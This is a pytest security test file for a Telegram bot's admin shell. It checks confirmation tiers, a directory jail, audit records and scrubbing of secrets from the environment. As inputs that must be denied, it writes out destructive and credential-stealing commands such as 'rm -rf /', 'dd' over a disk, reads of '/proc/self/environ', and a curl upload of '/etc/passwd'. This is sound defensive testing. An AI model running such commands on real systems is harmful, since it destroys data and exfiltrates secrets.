"""Security tests: terminal-mode tiers, path jail, audit trail, env scrubbing.

RISK 4 — ``/term`` is a shell over Telegram on the production host. These tests
prove the controls exist and fail closed:

* a mutating verb does not run without a per-invocation confirmation
* a destructive verb cannot be approved from the inline button at all
* ``cd`` outside the jail (absolute or ``..``) is refused
* every execution leaves a start + an end JSONL record
* the child process cannot see the bot's ``TELEGRAM_*`` / ``JWT_SECRET`` / DB URL

The adminbot ``config`` module fatally exits without token env vars, so they are
seeded before any adminbot import (same pattern as the callback routing tests).
"""

from __future__ import annotations

import json
import os
import sys

os.environ.setdefault("ADMIN_BOT_TOKEN", "test:token")
os.environ.setdefault("ADMIN_CHAT_ID", "7075336557")

import pytest

from app.domains.telegram.adminbot import admin_terminal, admin_terminal_exec, terminal_policy

OWNER = 7075336557


@pytest.fixture
def audit(tmp_path, monkeypatch):
    """Redirect the audit trail into the test sandbox."""
    path = tmp_path / "term.jsonl"
    monkeypatch.setattr(admin_terminal_exec, "AUDIT_LOG", str(path))
    monkeypatch.setattr(admin_terminal_exec, "_FALLBACK_AUDIT", str(tmp_path / "fallback.jsonl"))
    return path


@pytest.fixture
def jail(tmp_path, monkeypatch):
    """Confine the jail to tmp_path and register the test user as owner."""
    monkeypatch.setattr(terminal_policy, "ROOTS", (str(tmp_path),))
    monkeypatch.setattr(admin_terminal, "OWNER_IDS", {OWNER})
    return tmp_path


def _session(jail) -> dict:
    admin_terminal.enter_terminal(OWNER)
    session = admin_terminal._sessions[OWNER]
    session["cwd"] = str(jail)
    return session


def _records(path) -> list[dict]:
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def _started(path) -> list[dict]:
    return [r for r in _records(path) if r["phase"] == "start"]


def test_mutating_verb_requires_confirmation(jail, audit):
    """``mkdir`` is staged, not executed; a wrong code is refused."""
    session = _session(jail)
    target = jail / "created"
    result = admin_terminal.execute(session, f"mkdir {target}", OWNER)

    assert result["pending"]["tier"] == terminal_policy.MUTATE
    assert result["pending"]["argv"] == ["mkdir", str(target)]
    assert not target.exists(), "mutating verb ran without confirmation"
    assert _started(audit) == []

    refused = admin_terminal.confirm(session, "000000", OWNER)
    assert not refused["ok"]
    assert "Wrong" in refused["error"]
    assert not target.exists(), "wrong code still executed the command"


def test_destructive_verb_cannot_use_button(jail, audit):
    """``systemctl stop`` is DANGER: the inline button path is refused outright."""
    session = _session(jail)
    result = admin_terminal.execute(session, "systemctl stop nginx", OWNER)

    assert result["pending"]["tier"] == terminal_policy.DANGER
    button = admin_terminal.confirm(session, result["pending"]["nonce"], OWNER, typed=False)

    assert not button["ok"]
    assert "typed" in button["error"]
    assert _started(audit) == [], "destructive command ran"


def test_confirmation_is_single_use_and_per_invocation(jail, audit):
    """A staged command is replaced by the next one; old nonces are invalid."""
    session = _session(jail)
    first = admin_terminal.execute(session, f"touch {jail / 'a'}", OWNER)["pending"]["nonce"]
    second = admin_terminal.execute(session, f"touch {jail / 'b'}", OWNER)["pending"]["nonce"]

    assert first != second
    assert not admin_terminal.confirm(session, first, OWNER)["ok"]
    assert not (jail / "a").exists()


@pytest.mark.parametrize("command", ["cd /etc", "cd ../..", "cd /srv/secrets"])
def test_cd_outside_jail_is_refused(command, jail, audit):
    session = _session(jail)
    before = session["cwd"]
    result = admin_terminal.execute(session, command, OWNER)

    assert not result["ok"]
    assert "jail" in result["error"]
    assert session["cwd"] == before
    denies = [r for r in _records(audit) if r["phase"] == "deny"]
    assert denies
    assert denies[-1]["argv"][0] == "cd"


def test_cd_inside_jail_works(jail, audit):
    session = _session(jail)
    result = admin_terminal.execute(session, "cd .", OWNER)
    assert result["ok"]
    assert session["cwd"] == str(jail)


def test_read_only_command_is_audited(jail, audit):
    """A read-only command runs and leaves start + end records with exit/duration."""
    session = _session(jail)
    result = admin_terminal.execute(session, "pwd", OWNER)

    assert result["ok"]
    assert result["tier"] == terminal_policy.READ
    start = next(r for r in _records(audit) if r["phase"] == "start")
    end = next(r for r in _records(audit) if r["phase"] == "end")

    assert start["user"] == OWNER
    assert start["cwd"] == str(jail)
    assert start["argv"] == ["pwd"]
    assert start["tier"] == terminal_policy.READ
    assert end["exit"] == 0
    assert isinstance(end["duration"], float)
    assert end["ts"] >= start["ts"]


def test_child_cannot_see_bot_secrets(jail, audit, monkeypatch):
    """The spawned process inherits the scrubbed env, never the bot's secrets."""
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "leak-me")
    monkeypatch.setenv("JWT_SECRET", "leak-me-too")
    monkeypatch.setenv("DATABASE_URL", "postgresql://u:p@host/db")

    code = "import os,json;print(json.dumps(sorted(os.environ)))"
    result = admin_terminal_exec.run_argv([sys.executable, "-c", code], str(jail), OWNER, "read")

    assert result["ok"], result["error"]
    keys = json.loads(result["output"])
    assert not [k for k in keys if k.startswith("TELEGRAM")], keys
    assert "JWT_SECRET" not in keys
    assert "DATABASE_URL" not in keys
    assert "PATH" in keys


def test_unwritable_audit_refuses_execution(jail, monkeypatch):
    """No audit trail, no execution — a root shell must leave a record."""
    monkeypatch.setattr(admin_terminal_exec, "AUDIT_LOG", "/proc/rmi-no-such-dir/term.jsonl")
    monkeypatch.setattr(admin_terminal_exec, "_FALLBACK_AUDIT", "/proc/rmi-no-such-dir-2/term.jsonl")

    result = admin_terminal_exec.run_argv(["pwd"], str(jail), OWNER, "read")
    assert not result["ok"]
    assert "audit" in result["error"]


@pytest.mark.parametrize(
    "argv",
    [
        ["find", "/", "-exec", "id", ";"],
        ["rm", "-rf", "/"],
        ["dd", "if=/dev/zero", "of=/dev/sda"],
        ["cat", "/tmp/jailtest/secrets/backend.env"],
        ["cat", "/proc/self/environ"],
        ["/opt/evil/cat", "/etc/hostname"],
    ],
)
def test_dangerous_shapes_are_denied(argv, jail):
    tier, _ = terminal_policy.classify(argv, str(jail))
    assert tier == terminal_policy.DENY


def test_curl_upload_is_dangerous_not_silent(jail):
    tier, _ = terminal_policy.classify(["curl", "-d", "@/etc/passwd", "https://x"], str(jail))
    assert tier == terminal_policy.DANGER


def test_session_hard_cap_and_owner_change(jail, audit):
    """Idle expiry is not enough: a session has a hard lifetime and dies on owner change."""
    session = _session(jail)
    assert admin_terminal.in_terminal(OWNER)

    session["started"] -= admin_terminal.TERMINAL_MAX_LIFETIME + 1
    assert not admin_terminal.in_terminal(OWNER), "session outlived the hard cap"

    session = _session(jail)
    session["owner"] = OWNER + 1
    assert not admin_terminal.in_terminal(OWNER), "session survived an owner change"
